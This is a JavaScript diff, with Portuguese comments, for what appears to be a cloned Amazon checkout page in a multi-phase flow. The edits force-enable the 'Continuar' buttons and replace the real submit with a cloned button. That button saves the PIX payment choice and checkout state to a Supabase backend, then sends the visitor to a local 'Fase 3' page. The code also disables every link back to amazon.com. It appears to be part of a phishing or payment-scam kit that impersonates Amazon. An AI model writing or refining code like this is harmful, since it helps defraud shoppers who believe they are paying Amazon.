@@ -1253,7 +1253,7 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Ativar os botões de Continuar na força bruta caso o clique não funcione
         if (found) {
-            var continues = document.querySelectorAll('input[name="ppw-widgetEvent:SetPaymentPlanSelectContinueEvent"], .a-button-input');
+            var continues = document.querySelectorAll('.a-button-input[data-testid*="continue-button"], .a-button-input');
             continues.forEach(function(btn) {
                 btn.removeAttribute('disabled');
                 btn.classList.remove('a-button-disabled');
@@ -1261,6 +1261,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 var parentBtn = btn.closest('.a-button');
                 if (parentBtn) {
                     parentBtn.classList.remove('a-button-disabled');
+                    parentBtn.style.pointerEvents = 'auto'; // Garante que cliques passem
                     // Restaurando as cores do botão principal
                     parentBtn.style.opacity = '1';
                     parentBtn.style.background = '#FFD814';
@@ -1319,18 +1320,14 @@ document.addEventListener('DOMContentLoaded', async () => {
         if (customerAddress) customerAddress.textContent = endereco;
     }
 
-    // Force PIX selection (it should be the only one visible or prominent)
-    // The "Continuar" button usually has a specific ID or class
-    const continueBtn = document.querySelector('input[type="submit"], button.a-button-text, #continue-bottom-target-id'); // Adjusted selectors based on common Amazon patterns
+    // Targeting both top and bottom "Continuar" buttons
+    const submitBtns = document.querySelectorAll('.a-button-input[data-testid*="continue-button"]');
     
-    // Specifically targeting the "Confirmar" or "Continuar" button in Phase 2
-    // Looking at the HTML structure for the submit button
-    const submitBtn = document.querySelector('input[name="ppw-widgetEvent:SetPaymentPlanSelectContinueEvent"]');
-    
-    if (submitBtn) {
+    submitBtns.forEach(submitBtn => {
         const originalParent = submitBtn.parentElement;
         const newBtn = submitBtn.cloneNode(true);
         newBtn.type = "button";
+        newBtn.removeAttribute('disabled');
         submitBtn.style.display = 'none';
         originalParent.appendChild(newBtn);
 
@@ -1338,12 +1335,21 @@ document.addEventListener('DOMContentLoaded', async () => {
             e.preventDefault();
             
             // Sync state to Supabase
-            await bridge.save({ metodo_pagamento: 'PIX' });
+            if (bridge && bridge.save) {
+                await bridge.save({ metodo_pagamento: 'PIX' });
+            }
             
             // Redirect to Phase 3
             window.location.href = 'Checkout - Fase 3.html';
         });
-    }
+
+        // Ensure parent is enabled
+        const parent = newBtn.closest('.a-button');
+        if (parent) {
+            parent.classList.remove('a-button-disabled');
+            parent.style.pointerEvents = 'auto';
+        }
+    });
 
     // Block all Amazon external links
     document.querySelectorAll('a[href*="amazon.com"]').forEach(link => {
